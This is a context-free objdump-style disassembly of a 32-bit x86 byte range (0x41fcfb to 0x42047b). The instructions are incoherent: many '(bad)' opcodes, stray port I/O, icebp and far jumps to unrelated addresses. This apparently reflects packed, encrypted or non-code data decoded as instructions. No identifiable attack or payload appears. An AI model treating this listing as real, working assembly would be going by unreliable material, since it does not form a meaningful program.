  41fcfb:	imul   ebp,ebx,0x63
  41fcfe:	mov    ebp,0x62807130
  41fd03:	mov    ebx,0x8ff94f03
  41fd08:	dec    esp
  41fd09:	xor    eax,0x5e300195
  41fd0e:	xchg   edx,eax
  41fd0f:	adc    eax,0xb583d7a2
  41fd14:	inc    esp
  41fd15:	imul   eax,DWORD PTR [ecx+0x6c],0xf45aef66
  41fd1c:	push   es
  41fd1d:	ins    BYTE PTR es:[edi],dx
  41fd1e:	shl    DWORD PTR [ebx],0x15
  41fd21:	inc    edi
  41fd22:	push   cs
  41fd23:	dec    eax
  41fd24:	dec    edi
  41fd25:	jg     0x41fd1c
  41fd27:	(bad)  
  41fd28:	mov    edx,ecx
  41fd2a:	and    DWORD PTR [ecx+0x30],edx
  41fd2d:	or     edi,ebx
  41fd2f:	pop    edx
  41fd30:	idiv   BYTE PTR [ebx]
  41fd32:	in     eax,0x75
  41fd34:	mov    ebx,0x414cb112
  41fd39:	data16 mov cl,0x8d
  41fd3c:	pop    ss
  41fd3d:	test   dl,cl
  41fd3f:	jno    0x41fdc0
  41fd41:	iret   
  41fd42:	outs   dx,BYTE PTR ds:[esi]
  41fd43:	stc    
  41fd44:	lods   al,BYTE PTR ds:[esi]
  41fd45:	fisubr DWORD PTR [esp+eax*1+0x6493afd1]
  41fd4c:	repz in eax,0x62
  41fd4f:	mov    WORD PTR [ebx],es
  41fd51:	pop    es
  41fd52:	nop
  41fd53:	jb     0x41fce9
  41fd55:	jb     0x41fcf8
  41fd57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd58:	loop   0x41fdb1
  41fd5a:	pop    edx
  41fd5b:	faddp  st(4),st
  41fd5d:	adc    BYTE PTR [esi+0x217a32ca],cl
  41fd63:	jmp    0x41fd04
  41fd65:	lahf   
  41fd66:	cmp    BYTE PTR [esi+edx*1+0x4e],dl
  41fd6a:	fcmove st,st(5)
  41fd6c:	mov    ds:0xcc5a3266,eax
  41fd71:	xchg   cl,ah
  41fd73:	sub    bl,BYTE PTR [eax+0x22]
  41fd76:	neg    ch
  41fd78:	sub    BYTE PTR [ebx+0x4e],dh
  41fd7b:	fs or  BYTE PTR ds:[edi-0x6d47d74f],dh
  41fd83:	lods   eax,DWORD PTR ds:[esi]
  41fd84:	mov    ebp,0x9227dbdd
  41fd89:	mov    ch,0x85
  41fd8b:	outs   dx,BYTE PTR ds:[esi]
  41fd8c:	jp     0x41fde8
  41fd8e:	mov    WORD PTR [edi],fs
  41fd90:	imul   BYTE PTR [ebx-0x47605bc1]
  41fd96:	xor    esp,DWORD PTR [ebp-0x49943ce8]
  41fd9c:	push   edi
  41fd9d:	lahf   
  41fd9e:	outs   dx,DWORD PTR ds:[esi]
  41fd9f:	add    BYTE PTR [esi-0x77e8a846],0x88
  41fda6:	lock mov edx,0x1efed9f5
  41fdac:	rcr    BYTE PTR [edi-0x51482497],1
  41fdb2:	cmp    al,0x70
  41fdb4:	inc    ecx
  41fdb5:	es mov eax,0xd74b6057
  41fdbb:	add    DWORD PTR [eax],0x45
  41fdbe:	es mov ch,0x5b
  41fdc1:	cmp    edx,DWORD PTR [esi+0x3f8909ad]
  41fdc7:	dec    edi
  41fdc8:	scas   eax,DWORD PTR es:[edi]
  41fdc9:	sbb    ecx,esp
  41fdcb:	jl     0x41fd91
  41fdcd:	fwait
  41fdce:	icebp  
  41fdcf:	stos   DWORD PTR es:[edi],eax
  41fdd0:	arpl   WORD PTR [esi],cx
  41fdd2:	leave  
  41fdd3:	and    esp,ebx
  41fdd5:	les    esi,FWORD PTR [ebp-0x2]
  41fdd8:	jle    0x41fdcb
  41fdda:	adc    eax,0xedd7769
  41fddf:	dec    ebx
  41fde0:	mov    al,ds:0xb5601e68
  41fde5:	aas    
  41fde6:	mov    esi,0x8dfc1310
  41fdeb:	adc    eax,0x6ca07d06
  41fdf0:	(bad)  
  41fdf1:	into   
  41fdf2:	xor    esp,DWORD PTR [esi+0x5280e03d]
  41fdf8:	popf   
  41fdf9:	mov    eax,0x9c49fc6f
  41fdfe:	sbb    BYTE PTR [esi-0x25],ah
  41fe01:	shl    edi,cl
  41fe03:	cs cmc 
  41fe05:	fisttp WORD PTR [ebx+0x552da7fa]
  41fe0b:	xchg   esp,eax
  41fe0c:	push   esi
  41fe0d:	int3   
  41fe0e:	adc    al,0xc6
  41fe10:	push   eax
  41fe11:	xor    ch,BYTE PTR [ecx-0x337a31ff]
  41fe17:	ja     0x41fdff
  41fe19:	test   edi,edx
  41fe1b:	je     0x41fdf1
  41fe1d:	fdivrp st(0),st
  41fe1f:	jp     0x41fe58
  41fe21:	and    DWORD PTR [eax],edi
  41fe23:	xor    eax,0xcfe04ede
  41fe28:	push   0xffffffe0
  41fe2a:	repnz sub edx,DWORD PTR [ebx+edi*2-0xfa7211b]
  41fe32:	fwait
  41fe33:	cwde   
  41fe34:	mov    edi,0x140d60d5
  41fe39:	rol    DWORD PTR [edx+0x70fbb10d],0xba
  41fe40:	xchg   ebx,eax
  41fe41:	pop    ecx
  41fe42:	retf   0xea06
  41fe45:	sahf   
  41fe46:	sub    eax,0xc693bcd1
  41fe4b:	add    BYTE PTR [eax-0x5c],ah
  41fe4e:	jbe    0x41fdfa
  41fe50:	mov    es,WORD PTR [esi]
  41fe52:	mov    ebx,ecx
  41fe54:	cmp    eax,esp
  41fe56:	adc    BYTE PTR [esi],cl
  41fe58:	fcomp  st(0)
  41fe5a:	mov    ds,WORD PTR [eiz*8+0x53513140]
  41fe61:	mov    bh,0x13
  41fe63:	mov    ch,0xeb
  41fe65:	test   BYTE PTR [ebp-0x5d8dd196],dl
  41fe6b:	lock xor dl,dl
  41fe6e:	jecxz  0x41fe74
  41fe70:	std    
  41fe71:	lahf   
  41fe72:	sub    eax,0x42430cfe
  41fe77:	xchg   ebx,eax
  41fe78:	pop    esp
  41fe79:	mov    edx,0x8c113f70
  41fe7e:	mov    ch,ch
  41fe80:	pop    esi
  41fe81:	mov    edx,0xff0abbc7
  41fe86:	loop   0x41feba
  41fe88:	and    edi,DWORD PTR [ebx]
  41fe8a:	arpl   WORD PTR [ecx+ebp*1+0x7db34b1d],cx
  41fe91:	and    al,0x1d
  41fe93:	imul   ebp,ecx,0xe8b37326
  41fe99:	mov    al,0x4d
  41fe9b:	inc    edi
  41fe9c:	push   ebx
  41fe9d:	enter  0x3162,0x10
  41fea1:	add    BYTE PTR ds:0x20e6794a,ah
  41fea7:	and    edi,DWORD PTR es:[ebp-0x47]
  41feab:	stos   DWORD PTR es:[edi],eax
  41feac:	(bad)  
  41fead:	call   0x3199:0x6a4bdfcd
  41feb4:	jle    0x41fe8d
  41feb6:	sbb    eax,0x12eb9133
  41febb:	inc    ebx
  41febc:	cdq    
  41febd:	pushf  
  41febe:	jmp    0x41fe54
  41fec0:	mov    ds:0xc4c8a9d4,eax
  41fec5:	push   ss
  41fec6:	cs sbb eax,0x36b8d875
  41fecc:	mov    edx,DWORD PTR [ebp+0x30e75ac0]
  41fed2:	out    dx,eax
  41fed3:	fistp  WORD PTR [ebp-0x37]
  41fed6:	(bad)  
  41fed7:	mov    bh,0x90
  41fed9:	adc    BYTE PTR [ebx+ebx*2],al
  41fedc:	sub    bh,al
  41fede:	mov    ecx,0x8235ae16
  41fee3:	push   ds
  41fee4:	fadd   DWORD PTR [ebp+0x5]
  41fee7:	xchg   BYTE PTR [edi],ah
  41fee9:	ins    BYTE PTR es:[edi],dx
  41feea:	ins    BYTE PTR es:[edi],dx
  41feeb:	xchg   ebp,eax
  41feec:	push   0x72
  41feee:	repnz popa 
  41fef0:	neg    DWORD PTR [eax]
  41fef2:	mov    eax,0x1ea8c764
  41fef7:	sbb    al,0x95
  41fef9:	mov    esi,0xa2cff174
  41fefe:	jecxz  0x41febd
  41ff00:	inc    edi
  41ff01:	adc    al,0xd7
  41ff03:	xchg   ecx,eax
  41ff04:	in     eax,dx
  41ff05:	into   
  41ff06:	dec    esp
  41ff07:	xor    cl,bl
  41ff09:	jo     0x41fe9b
  41ff0b:	cmp    al,0xb0
  41ff0d:	icebp  
  41ff0e:	leave  
  41ff0f:	sub    eax,0xd7e00899
  41ff14:	adc    DWORD PTR [esi],esp
  41ff16:	lsl    edi,di
  41ff19:	bnd jns 0x41ff38
  41ff1c:	jp     0x41feeb
  41ff1e:	pushf  
  41ff1f:	test   DWORD PTR [esp+eiz*2],ebp
  41ff22:	inc    ebp
  41ff23:	xor    eax,0x750cbd3f
  41ff28:	push   ds
  41ff29:	lods   eax,DWORD PTR ds:[esi]
  41ff2a:	xor    al,0x8f
  41ff2c:	and    al,0x4b
  41ff2e:	and    BYTE PTR [edx+0x57],bl
  41ff31:	fcom   DWORD PTR [edi+esi*4+0x7d3b0c3e]
  41ff38:	sbb    al,0xfa
  41ff3a:	sbb    eax,0xfcd78384
  41ff3f:	icebp  
  41ff40:	push   esp
  41ff41:	loopne 0x41ff76
  41ff43:	and    bh,BYTE PTR [esi+edx*1-0xd57ebe7]
  41ff4a:	sbb    BYTE PTR [esi-0x6b],bl
  41ff4d:	std    
  41ff4e:	dec    edi
  41ff4f:	out    0xf4,eax
  41ff51:	mov    BYTE PTR [eax+0x25],al
  41ff54:	test   BYTE PTR [bx-0x12c7],ch
  41ff59:	add    al,0x9
  41ff5b:	xor    dh,BYTE PTR [ecx]
  41ff5d:	cmp    dl,BYTE PTR [edx-0x5dd7af49]
  41ff63:	push   ebx
  41ff64:	enter  0x1f94,0x5f
  41ff68:	add    al,BYTE PTR [edi]
  41ff6a:	iret   
  41ff6b:	ds test eax,0x3a874f5c
  41ff71:	stc    
  41ff72:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff74:	std    
  41ff75:	add    ch,ah
  41ff77:	retf   
  41ff78:	push   ds
  41ff79:	cmp    al,0xa5
  41ff7b:	in     eax,dx
  41ff7c:	leave  
  41ff7d:	stc    
  41ff7e:	lods   al,BYTE PTR ds:[esi]
  41ff7f:	add    dl,BYTE PTR [eax-0x491cfe4d]
  41ff85:	pusha  
  41ff86:	xchg   esp,eax
  41ff87:	xor    BYTE PTR [eax],ch
  41ff89:	sub    al,0xc7
  41ff8b:	mov    ds:0x37e40db9,al
  41ff90:	repz push edi
  41ff92:	retf   0xa80c
  41ff95:	dec    edi
  41ff96:	add    al,0x37
  41ff98:	or     eax,0x75292429
  41ff9d:	sbb    dh,BYTE PTR [edx-0x52]
  41ffa0:	(bad)  
  41ffa1:	out    0x68,eax
  41ffa3:	bound  edx,QWORD PTR [ebp-0x47f7359]
  41ffa9:	add    BYTE PTR [edi+0x71],dh
  41ffac:	iret   
  41ffad:	push   0xfffffffe
  41ffaf:	ret    0xf9
  41ffb2:	pop    edi
  41ffb3:	push   0xffffff82
  41ffb5:	cmc    
  41ffb6:	xor    cl,BYTE PTR [edi-0x5d49c824]
  41ffbc:	loop   0x41ffbf
  41ffbe:	addr16 xchg edx,eax
  41ffc0:	push   cs
  41ffc1:	pop    ecx
  41ffc2:	out    dx,al
  41ffc3:	imul   ebx,DWORD PTR [eax+0x6e421171],0xf
  41ffca:	rol    ch,cl
  41ffcc:	add    al,0xba
  41ffce:	lods   al,BYTE PTR ds:[esi]
  41ffcf:	das    
  41ffd0:	push   esi
  41ffd1:	out    dx,eax
  41ffd2:	ret    
  41ffd3:	jp     0x420046
  41ffd5:	sub    ecx,eax
  41ffd7:	ret    0xc236
  41ffda:	stos   DWORD PTR es:[edi],eax
  41ffdb:	fs jo  0x42001a
  41ffde:	rol    BYTE PTR [ebx+0x74],1
  41ffe1:	lods   al,BYTE PTR ds:[esi]
  41ffe3:	cmc    
  41ffe4:	push   edx
  41ffe5:	jno    0x41ff96
  41ffe7:	fdiv   QWORD PTR [edi-0x41b66045]
  41ffed:	sbb    esi,0x56bef697
  41fff3:	xor    DWORD PTR [ecx],0x74057047
  41fff9:	cmp    DWORD PTR [edi+ecx*2-0x45],ebp
  41fffd:	mov    dl,0x32
  41ffff:	xchg   esi,eax
  420000:	xchg   ebx,eax
  420001:	imul   ecx,DWORD PTR ds:0x7135c326,0xba944b61
  42000b:	mov    edx,0x975374a3
  420010:	push   ss
  420011:	cmc    
  420012:	xchg   DWORD PTR [edi-0x1bcac828],ebx
  420018:	ss imul ebx,ebp,0xffffffc3
  42001c:	or     DWORD PTR [edx+0x73],ebx
  42001f:	cmp    BYTE PTR [eax+0x29],ah
  420022:	mov    esi,0x2c815fe7
  420027:	dec    ecx
  420028:	or     BYTE PTR gs:0xd5caba80,dl
  42002f:	dec    edi
  420030:	mov    ebp,0x3d262d2e
  420035:	retf   0x5c34
  420038:	jmp    0x42002a
  42003a:	out    0xea,al
  42003c:	aad    0xcd
  42003e:	loop   0x420005
  420040:	push   cs
  420041:	fsub   st,st(7)
  420043:	xor    BYTE PTR [edi+0x57],dh
  420046:	rep ins BYTE PTR es:[edi],dx
  420048:	scas   eax,DWORD PTR es:[edi]
  420049:	mov    DWORD PTR [ebx+0x5ced25d1],ebp
  42004f:	das    
  420050:	adc    bl,cl
  420052:	cli    
  420053:	sbb    ch,BYTE PTR [edi-0x65ee4f38]
  420059:	daa    
  42005a:	mov    esi,0xdcf48782
  42005f:	push   edx
  420060:	stos   DWORD PTR es:[edi],eax
  420061:	push   0x16
  420063:	adc    BYTE PTR [edi],ch
  420065:	push   ds
  420066:	pop    edx
  420067:	pop    edx
  420068:	shl    esp,cl
  42006a:	stos   BYTE PTR es:[edi],al
  42006b:	stos   BYTE PTR es:[edi],al
  42006c:	repnz cmp eax,0x41f1515
  420072:	adc    BYTE PTR [eax+0x30],0x1a
  420076:	in     eax,0xe6
  420078:	pop    ds
  420079:	data16 jo 0x420065
  42007c:	call   0xe33e502f
  420081:	retf   0xbb75
  420084:	lods   al,BYTE PTR ds:[esi]
  420085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420086:	push   eax
  420087:	rol    BYTE PTR [edi],0xe2
  42008a:	push   esi
  42008b:	sbb    eax,0x56ef15c2
  420090:	pusha  
  420091:	xchg   BYTE PTR [eax],cl
  420093:	xor    eax,0x700b8942
  420098:	and    dh,BYTE PTR [edi-0x5bfe208a]
  42009e:	in     al,dx
  42009f:	dec    esi
  4200a0:	mov    ?,WORD PTR [ebx+eiz*4-0x133c1526]
  4200a7:	mov    ds:0x8db2b181,eax
  4200ac:	outs   dx,DWORD PTR ds:[esi]
  4200ad:	pop    eax
  4200ae:	mov    al,ds:0x8b08ac5e
  4200b3:	enter  0x387c,0xb9
  4200b7:	pusha  
  4200b8:	icebp  
  4200b9:	mov    eax,0xe64a66ba
  4200be:	xlat   BYTE PTR ds:[ebx]
  4200bf:	mov    al,ds:0x1647e7cf
  4200c4:	ret    
  4200c5:	fldcw  WORD PTR [esi-0x4e797b56]
  4200cb:	stos   BYTE PTR es:[edi],al
  4200cc:	hlt    
  4200cd:	xchg   ebx,eax
  4200ce:	xchg   BYTE PTR [edi+eiz*8+0x1],al
  4200d2:	daa    
  4200d3:	dec    edi
  4200d4:	lahf   
  4200d5:	mov    gs,WORD PTR ds:0x7e02e3f0
  4200db:	mov    ch,0x74
  4200dd:	pop    ds
  4200de:	loopne 0x4200f0
  4200e0:	sub    DWORD PTR [esi],ecx
  4200e2:	lds    ebx,FWORD PTR [esi+edi*4+0x5f]
  4200e6:	sub    eax,0xbd212713
  4200eb:	pop    esp
  4200ec:	stos   DWORD PTR es:[edi],eax
  4200ed:	sbb    eax,0x144e81c0
  4200f2:	pop    ebp
  4200f3:	int3   
  4200f4:	fild   DWORD PTR [esi+0x6f]
  4200f7:	adc    BYTE PTR [ecx-0x124a1f89],ah
  4200fd:	in     eax,0x25
  4200ff:	aam    0x4f
  420101:	sub    ecx,edi
  420103:	mov    ds,eax
  420105:	outs   dx,DWORD PTR ds:[esi]
  420106:	inc    eax
  420107:	in     al,dx
  420108:	cdq    
  420109:	xchg   esp,eax
  42010a:	mov    dh,0xe4
  42010c:	xor    DWORD PTR [si-0x1c09],edx
  420111:	inc    eax
  420112:	cs inc esi
  420114:	popa   
  420115:	dec    ebx
  420116:	adc    ah,bl
  420118:	das    
  420119:	mov    ch,0x54
  42011b:	(bad)  
  42011c:	jp     0x42018d
  42011e:	repnz xchg esp,eax
  420120:	aam    0x91
  420122:	(bad)  
  420123:	dec    eax
  420124:	inc    esi
  420125:	pop    ds
  420126:	fwait
  420127:	cmp    al,0x14
  420129:	call   0x694a7d18
  42012e:	leave  
  42012f:	pop    ecx
  420130:	push   ebx
  420131:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420132:	ds xchg esp,eax
  420134:	dec    ecx
  420135:	test   al,dl
  420137:	inc    ebp
  420138:	xchg   ebp,eax
  420139:	jge    0x420116
  42013b:	and    BYTE PTR ds:0xf2f858f0,0x5e
  420142:	js     0x42016f
  420144:	sbb    BYTE PTR [ebp-0x4f],al
  420147:	jnp    0x420129
  420149:	nop
  42014a:	or     eax,0x307083b4
  42014f:	and    ah,ch
  420151:	pop    ebx
  420152:	add    dh,BYTE PTR [ecx]
  420154:	popa   
  420155:	add    al,0x58
  420157:	out    dx,al
  420158:	imul   edi,esi,0x2b
  42015b:	(bad)  
  42015c:	outs   dx,DWORD PTR ds:[esi]
  42015d:	loope  0x42016e
  42015f:	fmul   QWORD PTR [edx-0x29]
  420162:	and    eax,0x19a48367
  420167:	mov    bl,0xd5
  420169:	xchg   ebp,eax
  42016a:	retf   0x3e07
  42016d:	gs cmp eax,0xabc16e07
  420173:	test   DWORD PTR [ebx],esi
  420175:	jmp    0x9059a249
  42017a:	inc    eax
  42017b:	xchg   ebx,eax
  42017c:	call   0xcd4a405
  420181:	and    eax,DWORD PTR [esi]
  420183:	cmp    al,0x85
  420185:	daa    
  420186:	push   0xffffffda
  420188:	inc    ecx
  420189:	cmp    BYTE PTR [ebx],ah
  42018b:	daa    
  42018c:	xor    al,0x6e
  42018e:	cmp    DWORD PTR [edi],ebp
  420190:	ds out dx,al
  420192:	and    BYTE PTR [edx-0x2d],0x64
  420196:	in     eax,0x1
  420198:	adc    ebx,eax
  42019a:	dec    ecx
  42019b:	jb     0x420134
  42019d:	mov    ch,dh
  42019f:	sub    dl,bl
  4201a1:	push   edx
  4201a2:	fdivr  DWORD PTR [edx]
  4201a4:	pop    edx
  4201a5:	cmp    eax,0xba4d3e48
  4201aa:	das    
  4201ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201ac:	push   edx
  4201ad:	push   edx
  4201ae:	(bad)  
  4201b0:	xchg   edx,eax
  4201b1:	sub    cl,BYTE PTR [esi+0x4a]
  4201b4:	and    dl,BYTE PTR [ebx-0x3b]
  4201b7:	xchg   edi,eax
  4201b8:	ins    BYTE PTR es:[edi],dx
  4201b9:	push   edi
  4201ba:	xchg   esp,eax
  4201bb:	adc    BYTE PTR [edi+0xd485085],ah
  4201c1:	add    DWORD PTR [esi],edx
  4201c3:	add    eax,0xabd9c3fc
  4201c8:	fst    DWORD PTR [edi-0x57]
  4201cb:	xor    edx,DWORD PTR [eax]
  4201cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201ce:	daa    
  4201cf:	xor    esp,DWORD PTR [edi+0x55d7fc9c]
  4201d5:	xor    esi,DWORD PTR [edi]
  4201d7:	mov    ch,0xfd
  4201d9:	dec    esi
  4201da:	(bad)  
  4201db:	repnz mov cl,0x2
  4201de:	dec    edx
  4201df:	add    edi,0x6
  4201e2:	adc    al,0xab
  4201e4:	or     DWORD PTR [ecx-0x6f60b354],0xc36daf1c
  4201ee:	push   cs
  4201ef:	push   cs
  4201f0:	jle    0x4201d8
  4201f2:	sub    DWORD PTR [esi+0x3d],edi
  4201f5:	sbb    eax,0xd4337330
  4201fa:	cwde   
  4201fb:	cmc    
  4201fc:	cmp    BYTE PTR ds:0xf5e50ea7,al
  420202:	adc    al,0xd4
  420204:	push   eax
  420205:	push   edi
  420206:	aas    
  420207:	ins    DWORD PTR es:[edi],dx
  420208:	std    
  420209:	jge    0x4201b2
  42020b:	sar    DWORD PTR ds:0x6f610f19,cl
  420211:	add    DWORD PTR [ebx+ecx*8],ebx
  420214:	mov    ?,WORD PTR [ebx]
  420216:	jecxz  0x4201bd
  420218:	enter  0x630c,0xb1
  42021c:	dec    edi
  42021d:	test   al,0xd6
  42021f:	(bad)  
  420220:	push   ss
  420221:	hlt    
  420222:	scas   eax,DWORD PTR es:[edi]
  420223:	fistp  WORD PTR [esi-0x69d9c050]
  420229:	lock mov dh,0x11
  42022c:	in     eax,0x1d
  42022e:	xchg   ebx,eax
  42022f:	fstp   DWORD PTR [edi+0x10]
  420232:	stos   DWORD PTR es:[edi],eax
  420233:	jecxz  0x420200
  420235:	es mov ebp,0xa0a3aa34
  42023b:	aad    0x6a
  42023d:	pop    es
  42023e:	test   esi,edx
  420240:	inc    ebp
  420241:	sbb    al,BYTE PTR [ebp+0x26]
  420244:	add    DWORD PTR [ebp+0x7f],ebx
  420247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420248:	stos   DWORD PTR es:[edi],eax
  420249:	jge    0x420263
  42024b:	push   es
  42024c:	fmul   QWORD PTR [ebx]
  42024e:	out    dx,al
  42024f:	imul   ebx,DWORD PTR [ebx+0x6b],0xffffffbe
  420253:	jmp    0x92efbbf2
  420258:	push   esp
  420259:	(bad)
  42025c:	pop    esp
  42025d:	xor    al,0x5c
  42025f:	out    0xca,al
  420261:	fidiv  DWORD PTR [edx]
  420263:	adc    BYTE PTR [ebx],dl
  420265:	ret    0x578c
  420268:	and    al,0x41
  42026a:	lahf   
  42026b:	int    0x95
  42026d:	push   0xffffffc0
  42026f:	lods   eax,DWORD PTR ds:[esi]
  420270:	jle    0x420239
  420272:	aaa    
  420273:	outs   dx,BYTE PTR ds:[esi]
  420274:	shl    DWORD PTR [ecx-0x2a],0xe8
  420278:	add    BYTE PTR [edx+0x2e706917],dl
  42027e:	outs   dx,BYTE PTR ds:[esi]
  42027f:	into   
  420280:	jl     0x420270
  420282:	daa    
  420283:	mov    edx,ebp
  420285:	pop    ecx
  420286:	xchg   BYTE PTR [ecx],cl
  420288:	mov    dl,0xda
  42028a:	(bad)  
  42028b:	shl    al,cl
  42028d:	rcl    BYTE PTR [ecx+0x68],1
  420290:	cmp    bl,cl
  420292:	not    DWORD PTR [esi]
  420294:	xor    bh,BYTE PTR ds:0x18c30730
  42029a:	xchg   esp,eax
  42029b:	push   esi
  42029c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42029d:	inc    esp
  42029e:	jmp    0x4202fd
  4202a0:	push   edx
  4202a1:	inc    eax
  4202a2:	inc    esi
  4202a3:	mov    al,0xb7
  4202a5:	mov    ch,0x12
  4202a7:	pop    ss
  4202a8:	pusha  
  4202a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202aa:	inc    edx
  4202ab:	xchg   esp,eax
  4202ac:	lahf   
  4202ad:	add    DWORD PTR [edx-0x59],esi
  4202b0:	in     al,dx
  4202b1:	cmp    edx,DWORD PTR [edx]
  4202b3:	rol    dx,cl
  4202b6:	lock sbb al,0xc4
  4202b9:	mov    esi,0x9605f217
  4202be:	adc    BYTE PTR [ecx+0x2c],bl
  4202c1:	mov    bl,al
  4202c3:	xor    cl,bh
  4202c5:	push   0x376f9ee1
  4202ca:	xchg   al,ch
  4202cc:	inc    esp
  4202cd:	(bad)  
  4202ce:	out    0xf,eax
  4202d0:	aas    
  4202d1:	repz pop eax
  4202d3:	xor    esi,DWORD PTR [edx+edx*1]
  4202d6:	cmc    
  4202d7:	rcr    bl,cl
  4202d9:	aas    
  4202da:	fisub  DWORD PTR [edi+edx*4+0x7c]
  4202de:	mov    dl,0x17
  4202e0:	and    DWORD PTR [edi+0x48],ebx
  4202e3:	div    DWORD PTR [ecx+0x49]
  4202e6:	ret    0x9b58
  4202e9:	and    esi,ecx
  4202eb:	jb     0x4202ae
  4202ed:	xchg   edi,eax
  4202ee:	arpl   WORD PTR [ecx-0x44],cx
  4202f1:	xlat   BYTE PTR ds:[ebx]
  4202f2:	es (bad) 
  4202f5:	add    DWORD PTR [ebx+0x450930f5],0x4
  4202fc:	loop   0x4202fd
  4202fe:	(bad)  
  4202ff:	mov    fs,WORD PTR [ecx-0x1e]
  420302:	inc    esp
  420303:	xchg   BYTE PTR [ebx+ebp*4-0x76ad3354],ch
  42030a:	retf   
  42030b:	mov    WORD PTR [ebp+0x3924af24],gs
  420311:	cmc    
  420312:	mov    ch,BYTE PTR fs:[esi-0x5e]
  420316:	inc    edi
  420317:	or     eax,0x336919ec
  42031c:	leave  
  42031d:	int    0xc5
  42031f:	xchg   ebp,eax
  420320:	mov    BYTE PTR [ebx+0x47],0x49
  420324:	pop    ebp
  420325:	repz (bad) 
  420327:	aad    0xdd
  420329:	or     esi,DWORD PTR [esi]
  42032b:	arpl   WORD PTR [edx-0x3618cd57],sp
  420331:	les    eax,FWORD PTR [ecx+0x4b]
  420334:	sbb    al,0x2b
  420336:	into   
  420337:	lods   eax,DWORD PTR ds:[esi]
  420338:	cdq    
  420339:	or     esi,edx
  42033b:	into   
  42033c:	mov    ah,0x41
  42033e:	sti    
  42033f:	ins    BYTE PTR es:[edi],dx
  420340:	dec    edi
  420341:	mov    dh,0x2a
  420343:	call   0xd96bdc39
  420348:	shl    esp,1
  42034a:	fcmovb st,st(1)
  42034c:	hlt    
  42034d:	pop    esp
  42034e:	pop    esp
  420350:	push   ebp
  420351:	loopne 0x42035a
  420353:	js     0x420356
  420355:	fsincos 
  420357:	jl     0x4203c5
  420359:	inc    eax
  42035a:	js     0x4202e1
  42035c:	xchg   ecx,eax
  42035d:	and    dl,0xac
  420360:	mov    BYTE PTR [edi+0x51b9a609],bl
  420366:	fst    DWORD PTR [ebp+0x3bf2da53]
  42036c:	jle    0x4203a7
  42036e:	mov    esi,DWORD PTR [ebx]
  420370:	pop    edi
  420371:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420372:	push   ds
  420373:	lea    ebx,[ecx-0x560c74c5]
  420379:	in     al,0x2
  42037b:	loope  0x4203b5
  42037d:	or     DWORD PTR [edx+ebp*4-0x7bb7cfb],0x14
  420385:	jecxz  0x4203dc
  420387:	sub    eax,esp
  420389:	jmp    0x8224:0x16470249
  420390:	idiv   DWORD PTR [edi-0x5ef4f052]
  420396:	mov    ds:0xf9e81741,al
  42039b:	shr    BYTE PTR [esi-0xd366ce4],0x18
  4203a2:	jp     0x4203d2
  4203a4:	arpl   dx,bx
  4203a6:	inc    edx
  4203a7:	push   esi
  4203a8:	push   ebp
  4203a9:	or     dh,BYTE PTR [edi-0x14]
  4203ac:	call   0x8233:0xf3a68fda
  4203b3:	jle    0x42034d
  4203b5:	out    dx,al
  4203b6:	add    al,0xec
  4203b8:	dec    edi
  4203b9:	cmp    eax,0xc13abdef
  4203be:	out    0xbb,eax
  4203c0:	out    dx,al
  4203c1:	dec    esi
  4203c2:	lahf   
  4203c3:	add    al,ah
  4203c5:	inc    ebx
  4203c6:	jle    0x4203d4
  4203c8:	(bad)
  4203cb:	mov    esi,0x7fbb02b6
  4203d0:	cmp    dl,BYTE PTR [ebp+0x35d1922b]
  4203d6:	dec    esp
  4203d7:	ds mov ch,0xf0
  4203da:	leave  
  4203db:	in     eax,dx
  4203dc:	xchg   esi,eax
  4203dd:	fild   QWORD PTR [eax+ecx*8]
  4203e0:	push   ecx
  4203e1:	pop    eax
  4203e2:	pop    ecx
  4203e3:	shl    DWORD PTR [esi],cl
  4203e5:	push   cs
  4203e6:	bound  ebp,QWORD PTR [esp+ebp*8]
  4203e9:	imul   ebp,DWORD PTR [ecx+0x3d],0xd38d2544
  4203f0:	sub    al,0x1e
  4203f2:	aad    0x6f
  4203f4:	loop   0x420403
  4203f6:	inc    ebx
  4203f7:	fiadd  DWORD PTR [esi-0x3b9a2060]
  4203fd:	add    ch,al
  4203ff:	mov    ebx,ebx
  420401:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420402:	lock xchg edx,eax
  420404:	cs aam 0xb1
  420407:	sub    al,0xcf
  420409:	and    al,0xcc
  42040b:	cs ins BYTE PTR es:[edi],dx
  42040d:	adc    eax,0x9a0e7914
  420412:	xor    eax,0x2566177b
  420417:	push   esi
  420418:	mov    al,0x3e
  42041a:	mov    edx,0xc9727904
  42041f:	ins    BYTE PTR es:[edi],dx
  420420:	jno    0x420475
  420422:	pop    edx
  420423:	aas    
  420424:	add    BYTE PTR [edx+edi*1+0x5b],bl
  420428:	inc    esp
  420429:	imul   ebx,DWORD PTR [eax],0xdf7dc937
  42042f:	adc    al,0xf7
  420431:	push   ebx
  420432:	xchg   esp,eax
  420433:	adc    DWORD PTR [ebp-0x2af723d3],eax
  420439:	xlat   BYTE PTR ds:[ebx]
  42043a:	icebp  
  42043b:	pop    ecx
  42043c:	(bad)  
  42043d:	fst    QWORD PTR [edx+0x60f9130f]
  420443:	lds    ecx,FWORD PTR [eax+0x70]
  420446:	xchg   esp,eax
  420447:	lea    edi,[esi+0x24f01c9e]
  42044d:	in     eax,dx
  42044e:	xor    al,0x88
  420450:	lods   al,BYTE PTR ds:[esi]
  420451:	jne    0x42044d
  420453:	jp     0x420404
  420455:	rcl    BYTE PTR ds:0xe9970b5b,0x6a
  42045c:	bound  ebx,QWORD PTR [edx-0xddd810]
  420462:	or     bh,al
  420464:	xor    BYTE PTR [ebx-0x59],bl
  420467:	sbb    al,0xd7
  420469:	iret   
  42046a:	lods   eax,DWORD PTR ds:[esi]
  42046b:	add    al,0x82
  42046d:	mov    ah,0x8c
  42046f:	addr16 cwde 
  420471:	fnsave [ebx-0x145ac92]
  420477:	xor    BYTE PTR [eax],bl
  420479:	cmp    al,0x32
  42047b:	int3   
